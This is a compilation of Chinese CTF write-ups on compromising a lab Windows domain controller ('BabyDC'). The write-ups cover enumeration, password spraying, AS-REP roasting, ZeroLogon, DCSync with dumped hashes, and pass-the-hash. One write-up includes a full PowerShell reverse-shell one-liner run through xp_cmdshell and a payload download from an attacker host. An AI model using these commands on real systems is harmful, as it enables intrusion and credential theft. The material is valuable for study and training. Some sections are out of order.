| JOoIcnZUF1Bn7bzq70r7R9a26XRBjBVPTGv0jC9vwNoF1C3tTgXeGb45vSzBU2c8 | /h52fxGJQSpALZQLRlwUOKcMD/xAmYF/jsfyWx8jFN/n5w94JZb2NS+m8frTCC5B
| HrK5GJvXSsOxXwkCAwEAATANBgkqhkiG9w0BAQUFAAOCAQEAlTvxAMrdDvLqMbaV
| llLhQMT9WlVAjKHKgijbROdxhm//Ew39VaI5ihBkBRZeg/4i7ItI+yXBnUX/Hugx
| qrItAekUivjN3+aJheNQu5kKBRYKczs41zpHfryUDPPf/pu5oHRxoTZXy+n3gAf+ | dOc9HLH8edRS3MWLg9blorr9BlJgMlFqiYRmXKSPnkco5TneYZwqPq4x1w6CQLfd
| HPMNJiLfk9tix6/w47u+Oicr0CkrlQm1X6IeW3fPEUw5+GjP6TTQ8DnNSu6k+Qgc | jjXlBUG+YXFSoT3aimXn7eXjyXxcoVXtsxEnDKaWRSkqqcH0N5O5Dn0Npl8c2W0I
| rUXTmA==
|_-----END CERTIFICATE-----
```

```plain
3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP
(Domain: XMCVE.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 128
9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
49738/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 08:00:27:5F:60:98 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: CASTLEVANIA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

```plain
Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| nbstat: NetBIOS name: CASTLEVANIA, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:5f:60:98
(PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   CASTLEVANIA<00>      Flags: <unique><active>
|   XMCVE<00>            Flags: <group><active>
|   XMCVE<1c>            Flags: <group><active>
|   CASTLEVANIA<20>      Flags: <unique><active>
|   XMCVE<1b>            Flags: <unique><active>
| Statistics:
|   08:00:27:5f:60:98:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-03-28T02:13:29
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 46026/tcp): CLEAN (Timeout)
|   Check 2 (port 53618/tcp): CLEAN (Timeout)
|   Check 3 (port 62163/udp): CLEAN (Timeout)
|   Check 4 (port 51584/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

## Kerberos 用户枚举
前面尝试了 smb、ldap、rpc 等协议的匿名枚举都失败了，看来还是得看看80端口 nuclei扫描的时候发现好像有短文件名解析的漏洞这个扫描结果让我联想到之前看到的一个靶机

发现 [http://192.168.39.134/poo_connection.txt](http://192.168.39.134/poo_connection.txt)

获得初始凭证

虽然没有 xp_cmdshell 的权限，但是发现有连接

发现 POO_PUBLIC 是 sysadmin 权限，有 xp_cmdshell

## 反弹shell
```plain
exec ('xp_cmdshell ''powershell -nop -w hidden -ep bypass -c "$client = New-Object
System.Net.Sockets.TCPClient(''''192.168.39.142'''',4444);$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0)
{$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + ''''PS '''' + (Get-Location).Path + ''''> '''';$sendbyte =
([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Len gth);$stream.Flush()};$client.Close()"''') at POO_PUBLIC;
```

上线cs，这里讲道理来说有 Windows Defender，但是我也不确定我的免杀起作用了没有

```plain
iwr http://192.168.39.142:8000/ezad1.exe -OutFile C:\Windows\Tasks\ezad1.exe
```

## SharpHound
没招了，丢个SharpHound上去跑一下

```plain
shell C:\Windows\Tasks\SharpHound.exe -c All --zipfilename loot.zip --OutputDirectory C:\Windows\Tasks
```

## AS-REP Roasting
很容易能发现 [MOWEN@XMCVE.LOCAL](mailto:MOWEN@XMCVE.LOCAL) 可以 AS-REP Roast

```plain
GetNPUsers.py XMCVE.local/mowen -no-pass -dc-ip 192.168.39.134
hashcat -m 18200 mowen.asrep /usr/share/wordlists/rockyou.txt       #1maxwell
```

cs 派生一个 beacon，但是不知道为什么不能执行命令，猜下一步应该是 SeBackupPrivilege 提升权限，通过卷影副本提取 SAM/SYSTEM 文件的副本，问题就是没那到 mowen 用户的执行权限

## zerologon
没想到原来能打 zerologon，这应该是一个非预期

置空域管hash后导出

pth 上线

但是我还是很纠结，mowen 到底怎么利用 SeBackupPrivilege 权限，没有 smbexec wmiexec winrmexec ，派生也没有拿到shell



# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">''Always⌒</font><font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">   </font>
## 题目信息
名称: BabyDC

类别: Web

分数: 1000

赛事: PolarisCTF 2026

---

## 环境配置
从提供的百度网盘链接下载了虚拟机镜像，并将其导入到 VirtualBox 7.2.0 中。虚拟机配置了NAT (Host-Only) 网络适配器，以便攻击机 (Kali Linux) 能够直接访问它。

---

## 信息收集
Nmap 网段+端口扫描

```plain
$ nmap -sV -sC 192.168.40.132

PORT     STATE SERVICE

53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

目标是一台 Windows Server 2019 域控制器 (Build 17763)。

---

## 通过 LDAP 获取域信息
对 rootDSE 进行匿名 LDAP 绑定，发现了以下信息：

域名: XMCVE.local

DC 主机名: CASTLEVANIA.XMCVE.local

林/域功能级别: 7 (Windows Server 2016)

---

## SMB 枚举
匿名/访客 (Guest) SMB 登录被拒绝。空会话 (Null session) 同样被阻止。

---

## Kerberos 用户枚举
使用 Kerberos AS-REQ 请求来枚举有效账户：

```plain
$ ldapsearch -x -H ldap://192.168.40.132 -s base

# dnsHostName: CASTLEVANIA.XMCVE.local
# defaultNamingContext: DC=XMCVE,DC=local

$ crackmapexec smb 192.168.40.132

SMB  192.168.40.132  445  CASTLEVANIA  [*] Windows 10 / Server 2019 Build 17763 x64
     (name:CASTLEVANIA) (domain:XMCVE.local) (signing:True) (SMBv1:False)
```

发现的有效账户包括： administrator , admin , castlevania , support。

所有账户都需要预身份验证（意味着无法进行 AS-REP Roasting 攻击）。

```plain
$ impacket-GetNPUsers XMCVE.local/ -dc-ip 192.168.40.132 -no-pass -usersfile users.txt

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User castlevania doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User support doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED (guest, krbtgt - disabled)
```

---

## 漏洞发现
ZeroLogon (CVE-2020-1472)

使用 CrackMapExec 检查域控制器是否存在 ZeroLogon 漏洞：

该域控存在 CVE-2020-1472 (ZeroLogon) 漏洞。此漏洞利用了 Netlogon 协议中 AES-CFB8 实现的加密学缺陷，允许未经身份验证的攻击者将域控制器的计算机账户密码直接重置为空。

---

## 漏洞利用
### 第一步：ZeroLogon 漏洞利用
```plain
$ crackmapexec smb 192.168.40.132 -u '' -p '' -M zerologon

ZEROLOGO...  192.168.40.132  445  CASTLEVANIA  VULNERABLE

msf6> use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
msf6> set RHOSTS 192.168.40.132
msf6> set NBNAME CASTLEVANIA
msf6> run

[+] 192.168.40.132:49668 - Successfully authenticated
[+] 192.168.40.132:49668 - Successfully set the machine account (CASTLEVANIA$) password to:
    aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
```

---

### 第二步：DCSync - 导出所有域哈希
```plain
$ impacket-secretsdump -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' \
   -just-dc 'XMCVE.local/CASTLEVANIA$'@192.168.40.132

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1e3c4fe72e1383c576b4b3aeef4730a8:::
Alucard:1000:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
XMCVE.local\p2zhh:1104:aad3b435b51404eeaad3b435b51404ee:bc2bf43119e258bcecf71d44abc29db7:::
XMCVE.local\mowen:1105:aad3b435b51404eeaad3b435b51404ee:efb5fa49a38497a71e144f690860688e:::
```

---

### 第三步：哈希传递- 获取管理员 Shell
```plain
XMCVE.local\sales:1106:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
XMCVE.local\support:1107:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::
:
XMCVE.local\it:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
XMCVE.local\hr:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
XMCVE.local\admin:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
XMCVE.local\sqlsvc:1112:aad3b435b51404eeaad3b435b51404ee:d93ef04edb808c5bce3a5bd67b936ca9:::
CASTLEVANIA$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```plain
$ impacket-psexec -hashes ':d94f9831271e229dbc6e712097b63168' \
   'XMCVE.local/Administrator@192.168.40.132' 'whoami'

nt authority\system
```

```plain
$ impacket-wmiexec -hashes ':d94f9831271e229dbc6e712097b63168' \
   'XMCVE.local/Administrator@192.168.40.132' 'whoami'

xmcve\administrator
```

```plain
$ impacket-wmiexec -hashes ':d94f9831271e229dbc6e712097b63168' \
   'XMCVE.local/Administrator@192.168.40.132' 'hostname'
   
CASTLEVANIA
```

```plain
$ impacket-wmiexec -hashes ':d94f9831271e229dbc6e712097b63168' \
   'XMCVE.local/Administrator@192.168.40.132' 'net user administrator'

User name                   Administrator
Account active              Yes
Local Group Memberships     *Administrators
Global Group memberships    *Domain Users         *Domain Admins
```

---

## 攻击路径总结
```plain
*Enterprise Admins    *Schema Admins
                 *Group Policy Creator

未经身份验证的攻击者
   │
   ▼
[1] ZeroLogon (CVE-2020-1472)
   │ 利用 Netlogon AES-CFB8 缺陷绕过身份验证
   │ 将 CASTLEVANIA$ 计算机账户密码置空
   ▼
[2] DCSync
   │ 使用空密码的计算机账户凭据，通过 DRSUAPI
   │ 协议复制所有域密码哈希
   ▼
[3] 哈希传递 (Pass-the-Hash)
   │ 使用 Administrator 的 NTLM 哈希
   │ (d94f9831271e229dbc6e712097b63168) 进行身份验证并执行命令
   ▼
[4] 获取 CASTLEVANIA (DC) 的 SYSTEM / Domain Admin Shell
```

# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Pr0x1ma</font><font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">   </font>
## 配环境  
![](/image/myself%20machine/Castlevania-Unexpected-23.png)

![](/image/myself%20machine/Castlevania-Unexpected-24.png)

## 找ip  
> 找到 192.168.56.101 然后扫一下
>

```plain
nmap -sn 192.168.56.0/24
```

![](/image/myself%20machine/Castlevania-Unexpected-25.png)

## nmap
```plain
nmap -sV -sC -A -oN dc1_scan.txt 192.168.56.101
```

![](/image/myself%20machine/Castlevania-Unexpected-26.png)

##  分析
```plain
主机信息
主机名：CASTLEVANIA
域名：XMCVE.local
端口与服务
7、80：IIS 10（Web 服务）
88：Kerberos（身份验证服务）
389 / 3268：LDAP / 全局编录（域目录服务）
445：SMB（文件共享服务）
1433：Microsoft SQL Server 2016 SP2
```

##  Web 
> 但是没啥东西，在用dirsearch看看  
>

```plain
curl -I 192.168.56.101
```

![](/image/myself%20machine/Castlevania-Unexpected-27.png)

## dirsearch
>  也没什么东西  
>

![](/image/myself%20machine/Castlevania-Unexpected-28.png)

##  Kerberos 
>  不能进行AS-REP Roasting  
>

![](/image/myself%20machine/Castlevania-Unexpected-29.png)

##  MSSQL  
>  没用，空密码登录也不行  
>

![](/image/myself%20machine/Castlevania-Unexpected-30.png)

##  DNS  
>  啥也没有  
>

![](/image/myself%20machine/Castlevania-Unexpected-31.png)

![](/image/myself%20machine/Castlevania-Unexpected-32.png)

![](/image/myself%20machine/Castlevania-Unexpected-33.png)

##  ZeroLogon  
### 检测
>  找了半天发现ZeroLogon是可行的  
>

![](/image/myself%20machine/Castlevania-Unexpected-34.png)

### 利用
>  找个能利用的脚本，清空密码  
>

![](/image/myself%20machine/Castlevania-Unexpected-35.png)

##  DCSync  
>  DCSync拿Administrator的哈希  
>

![](/image/myself%20machine/Castlevania-Unexpected-36.png)

## Getshell
>  哈希传递拿shell  
>

![](/image/myself%20machine/Castlevania-Unexpected-37.png)

# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">公主姐姐</font>**<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">（域用户-弱口令）</font>**
## <font style="color:rgb(51, 51, 51);">题目信息</font>
<font style="color:rgb(51, 51, 51);">题目名称：BabyDC</font>

<font style="color:rgb(51, 51, 51);">目标地址：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.155</font>`

<font style="color:rgb(51, 51, 51);">本题没有提供最终 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">flag.txt</font>`<font style="color:rgb(51, 51, 51);">，通关目标是获取最高权限。实际打通后，不仅拿到了目标主机的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">NT AUTHORITY\SYSTEM</font>`<font style="color:rgb(51, 51, 51);">，还进一步导出了整套域凭据，因此可以认为整台域控已经被完全接管。</font>

## <font style="color:rgb(51, 51, 51);">整体判断</font>
<font style="color:rgb(51, 51, 51);">这题最关键的地方不在 Web 页面本身，而在于它是一台对外暴露了多种企业服务的域控。最开始做端口识别时，可以看到同时开放了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">80</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">88</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">389</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">445</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1433</font>`<font style="color:rgb(51, 51, 51);"> 等典型的 AD 与 MSSQL 服务端口。看到这种端口组合，应该立刻意识到这不是单纯的 Web 打点题，而是一个典型的“从弱口令或目录服务入手，逐步拿域内高权限”的内网题。</font>

<font style="color:rgb(51, 51, 51);">真正打通这题的主链如下：</font>

1. <font style="color:rgb(51, 51, 51);">先识别主机角色，确认这是一台域控。</font>
2. <font style="color:rgb(51, 51, 51);">用 Kerberos 与 SMB 做小规模弱口令喷洒，拿到首个低权域账户。</font>
3. <font style="color:rgb(51, 51, 51);">用这个低权账户查询 LDAP，找到开启“不需要 Kerberos 预认证”的用户。</font>
4. <font style="color:rgb(51, 51, 51);">对该用户做 AS-REP Roast，离线爆破得到更高价值账户口令。</font>
5. <font style="color:rgb(51, 51, 51);">利用该账户属于 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 这一点，远程备份注册表 hive。</font>
6. <font style="color:rgb(51, 51, 51);">将 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SECURITY</font>`<font style="color:rgb(51, 51, 51);"> 拉回本地离线提取秘密，拿到本地 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 哈希和服务账号口令。</font>
7. <font style="color:rgb(51, 51, 51);">使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM 直接 Pass-the-Hash 到目标，获得 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">。</font>
8. <font style="color:rgb(51, 51, 51);">再用已经拿到的高权限继续导出整套域凭据，完成整题。</font>

<font style="color:rgb(51, 51, 51);">整个过程里，真正起决定作用的知识点只有三个：</font>

+ <font style="color:rgb(51, 51, 51);">域用户弱口令喷洒</font>
+ <font style="color:rgb(51, 51, 51);">AS-REP Roast</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 结合 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">reg.py backup</font>`<font style="color:rgb(51, 51, 51);"> 远程导出 hive</font>

<font style="color:rgb(51, 51, 51);">其它分支虽然有探测，但并没有用于最终利用链，这里不写。</font>

## <font style="color:rgb(51, 51, 51);">第一步：端口识别，确认目标是一台域控</font>
<font style="color:rgb(51, 51, 51);">先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">nmap</font>`<font style="color:rgb(51, 51, 51);"> 对目标做标准服务识别：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">nmap -Pn -sC -sV -T4 192.168.56.155</font>

<font style="color:rgb(51, 51, 51);">这条命令的作用如下：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">-Pn</font>`<font style="color:rgb(51, 51, 51);"> 表示不做主机发现，直接认为目标在线，避免 ICMP 被过滤导致误判。</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">-sC</font>`<font style="color:rgb(51, 51, 51);"> 调用常用 NSE 脚本，补充基础服务信息。</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">-sV</font>`<font style="color:rgb(51, 51, 51);"> 探测服务版本。</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">-T4</font>`<font style="color:rgb(51, 51, 51);"> 提高扫描速度。</font>

<font style="color:rgb(51, 51, 51);">关键结果如下：</font>

```plain
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 SP2

Domain: XMCVE.local
Host: CASTLEVANIA.XMCVE.local
```

<font style="color:rgb(51, 51, 51);">看到这个结果时，基本可以直接下结论：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">88</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">389</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">445</font>`<font style="color:rgb(51, 51, 51);"> 说明这是 AD 环境。</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">389</font>`<font style="color:rgb(51, 51, 51);"> 的返回里已经给出了域名 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE.local</font>`<font style="color:rgb(51, 51, 51);">。</font>
+ <font style="color:rgb(51, 51, 51);">主机名是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA.XMCVE.local</font>`<font style="color:rgb(51, 51, 51);">。</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1433</font>`<font style="color:rgb(51, 51, 51);"> 说明这台机子还跑了 SQL Server。</font>

<font style="color:rgb(51, 51, 51);">这一步非常重要，因为后面所有账号格式、认证方式、攻击顺序都要围绕“域控”来设计。也正因为它是域控，所以一旦打穿，收益会非常高。</font>

## <font style="color:rgb(51, 51, 51);">第二步：小规模弱口令喷洒，拿到第一个可用域账户</font>
<font style="color:rgb(51, 51, 51);">既然这是域环境，直接盲扫 Web 没有明显入口时，最自然的思路就是先找一个最低成本的可用身份。这里没有上大字典，而是只做了小规模、高命中率的喷洒，避免无意义浪费时间。</font>

<font style="color:rgb(51, 51, 51);">先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GetNPUsers.py</font>`<font style="color:rgb(51, 51, 51);"> 对一小批可能存在的用户做探测：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">GetNPUsers.py XMCVE.local/ -dc-ip 192.168.56.155 -no-pass -usersfile /tmp/babydc_users.txt</font>

<font style="color:rgb(51, 51, 51);">这条命令的作用不是爆密码，而是利用 Kerberos 的错误回显区分“用户存在”和“用户不存在”。</font>

<font style="color:rgb(51, 51, 51);">从结果里可以确认如下用户是存在的：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">admin</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">support</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">castlevania</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">alucard</font>`

<font style="color:rgb(51, 51, 51);">有了有效用户名后，再用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">netexec</font>`<font style="color:rgb(51, 51, 51);"> 对 SMB 做一个非常小的弱口令喷洒：</font>

```plain
netexec smb 192.168.56.155 \
  -u /tmp/babydc_valid_users.txt \
  -p /tmp/babydc_passwords.txt \
  --continue-on-success
```

<font style="color:rgb(51, 51, 51);">这里的思路很明确：</font>

+ <font style="color:rgb(51, 51, 51);">只打一小批最常见口令，如 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Password123!</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">P@ssw0rd!</font>`<font style="color:rgb(51, 51, 51);"> 以及用户名同密码变体。</font>
+ <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">--continue-on-success</font>`<font style="color:rgb(51, 51, 51);"> 保证一个账户命中后继续跑完，看看是否存在统一弱口令。</font>

<font style="color:rgb(51, 51, 51);">关键命中结果如下：</font>

```plain
[+] XMCVE.local\admin:Password123!
[+] XMCVE.local\support:Password123!
```

<font style="color:rgb(51, 51, 51);">这一步说明题目确实存在统一弱口令设计，而且此时已经拥有了两个可用域用户。虽然它们还不是高权限，但已经足够进入 LDAP 查询阶段。</font>

## <font style="color:rgb(51, 51, 51);">第三步：查询 LDAP，锁定真正有利用价值的用户</font>
<font style="color:rgb(51, 51, 51);">有了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">admin:Password123!</font>`<font style="color:rgb(51, 51, 51);"> 之后，下一件事不是继续无脑喷更多口令，而是立刻转向 LDAP 收集高价值用户属性。</font>

<font style="color:rgb(51, 51, 51);">这里使用：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">netexec ldap 192.168.56.155 -u admin -p 'Password123!' --users</font>

<font style="color:rgb(51, 51, 51);">这个命令会把域中的用户枚举出来，并附带一些基础属性，比如最近修改密码时间、描述等。关键输出如下：</font>

```plain
Administrator
Alucard
p2zhh
mowen
sales
support
it
hr
admin
sqlsvc    SQL Server Service Account
```

<font style="color:rgb(51, 51, 51);">接着进一步查询 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 的属性：</font>

```plain
ldapsearch -x -H ldap://192.168.56.155 \
  -D 'XMCVE\admin' -w 'Password123!' \
  -b 'DC=XMCVE,DC=local' \
  '(sAMAccountName=mowen)' \
  pwdLastSet description memberOf userAccountControl
```

<font style="color:rgb(51, 51, 51);">关键结果是：</font>

```plain
memberOf: CN=Backup Operators,CN=Builtin,DC=XMCVE,DC=local
userAccountControl: 4260352
```

<font style="color:rgb(51, 51, 51);">这里的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">4260352</font>`<font style="color:rgb(51, 51, 51);"> 非常关键。把它转成十六进制是：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">0x410200</font>

<font style="color:rgb(51, 51, 51);">它包含了以下位：</font>

+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">NORMAL_ACCOUNT</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">DONT_EXPIRE_PASSWORD</font>`
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">DONT_REQ_PREAUTH</font>`

<font style="color:rgb(51, 51, 51);">其中真正决定利用方向的是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">DONT_REQ_PREAUTH</font>`<font style="color:rgb(51, 51, 51);">。这意味着 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 不需要 Kerberos 预认证，可以直接做 AS-REP Roast。与此同时，它还属于 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);">，说明即使这个账户不是管理员，也非常可能具备系统级备份相关能力。这两个条件叠加，使得 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 立刻成为整题最关键的突破口。</font>

## <font style="color:rgb(51, 51, 51);">第四步：对 mowen 做 AS-REP Roast，离线爆出真实口令</font>
<font style="color:rgb(51, 51, 51);">确定 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 开启了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">DONT_REQ_PREAUTH</font>`<font style="color:rgb(51, 51, 51);"> 后，下一步就是直接请求它的 AS-REP 响应并离线爆破。</font>

<font style="color:rgb(51, 51, 51);">先生成哈希：</font>

```plain
echo mowen >/tmp/mowen_only.txt
GetNPUsers.py XMCVE.local/ \
  -dc-ip 192.168.56.155 \
  -no-pass \
  -request \
  -format hashcat \
  -outputfile /tmp/mowen_asrep.hash \
  -usersfile /tmp/mowen_only.txt
```

<font style="color:rgb(51, 51, 51);">生成出的哈希大致如下：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">$krb5asrep$23$mowen@XMCVE.LOCAL:2ebf4c95b4b4915427a335c63359292f$...</font>

<font style="color:rgb(51, 51, 51);">然后使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">hashcat</font>`<font style="color:rgb(51, 51, 51);"> 离线爆破：</font>

```plain
hashcat -m 18200 /tmp/mowen_asrep.hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 18200 /tmp/mowen_asrep.hash --show --force
```

<font style="color:rgb(51, 51, 51);">这里 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">-m 18200</font>`<font style="color:rgb(51, 51, 51);"> 对应的就是 Kerberos 5 AS-REP 哈希模式。</font>

<font style="color:rgb(51, 51, 51);">最终爆破结果：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">mowen:1maxwell</font>

<font style="color:rgb(51, 51, 51);">也就是说，我们拿到了第二个更高价值的域用户：</font>

<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">XMCVE\mowen : 1maxwell</font>

